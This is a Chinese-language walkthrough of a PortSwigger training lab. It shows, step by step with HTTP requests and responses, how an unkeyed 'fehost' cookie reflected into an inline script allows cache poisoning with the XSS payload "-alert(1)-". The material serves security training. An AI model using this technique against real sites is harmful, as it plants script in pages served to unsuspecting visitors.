# 实验室：利用未键控 Cookie 的 Web 缓存投毒

本实验室存在 Web 缓存投毒漏洞，原因是 Cookie 未被包含在缓存键中。一名不知情用户会定期访问网站首页。要解决本实验室，请投毒缓存，使响应在访客浏览器中执行 `alert(1)`。

[访问实验室](https://portswigger.net/academy/labs/launch/d131a4d5f8a6a7e2ae584e9bc217208c223cad4bac3aed016482305228d68fb2)

## 步骤

探测
- 访问主页
    ```http
    GET / HTTP/2
    Host: 0a2800a703be238481cc250f00c1007b.web-security-academy.net
    ```

    - 响应
        ```http
        HTTP/2 200 OK
        Content-Type: text/html; charset=utf-8
        Set-Cookie: session=huByB9lwf5xi2lohVttpF91ZP4xZvtM7; Secure; HttpOnly; SameSite=None
        Set-Cookie: fehost=prod-cache-01; Secure; HttpOnly

        <script>
            data = {
                "host":"0a2800a703be238481cc250f00c1007b.web-security-academy.net","path":"/","frontend":"prod-cache-01"
            }
        </script>
        ```

    - 此处 cookie 的内容与 HTML 脚本原始内相同，可能被反射

测试 cookie 反射
- 请求
    ```http
    GET / HTTP/2
    Host: 0a2800a703be238481cc250f00c1007b.web-security-academy.net
    Cookie: session=cyLDNKYyZF3Qe8uXbxslNYj1QBGa6VzC; fehost=fooooo
    ```

- 响应
    ```html
    <script>
        data = {
            "host":"0a2800a703be238481cc250f00c1007b.web-security-academy.net","path":"/","frontend":"fooooo"
        }
    </script>
    ```
- 确认 cookie 反射

测试 cookie 反射的缓存
- 发送 cookie 反射请求
    `X-Cache: miss`
- 发送删除注入 cookie 字段的请求
    `X-Cache: hit`
- 确认注入的 cookie 字段 `fehost` 不是缓存键

测试 cookie 字段 XSS 注入
- 请求
    ```http
    GET / HTTP/2
    Host: 0a2800a703be238481cc250f00c1007b.web-security-academy.net
    Cookie: session=cyLDNKYyZF3Qe8uXbxslNYj1QBGa6VzC; fehost="-alert(1)-"
    ```

- 响应
    ```html
    <script>
    data = {
        "host":"0a2800a703be238481cc250f00c1007b.web-security-academy.net","path":"/","frontend":""-alert(1)-""
    }
    </script>
    ```

- 浏览器访问主页，成功触发弹窗。稍等后通关
